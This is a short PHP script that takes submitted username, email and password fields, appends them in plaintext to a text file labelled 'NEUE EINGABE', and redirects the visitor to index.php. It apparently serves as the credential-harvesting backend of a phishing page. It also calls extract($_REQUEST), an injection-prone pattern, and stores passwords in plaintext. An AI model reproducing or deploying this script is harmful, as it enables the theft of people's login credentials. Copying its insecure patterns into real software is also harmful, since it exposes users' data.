<?php
    extract($_REQUEST);
    $file=fopen("save_login.txt","a");

    fwrite($file,"NEUE EINGABE: \n");
    fwrite($file,"name :");
    fwrite($file, $username ."\n");
    fwrite($file,"Email :");
    fwrite($file, $email ."\n");
    fwrite($file,"Password :");
    fwrite($file, $password ."\n\n");
    fclose($file);
    header("location: index.php");
 ?>
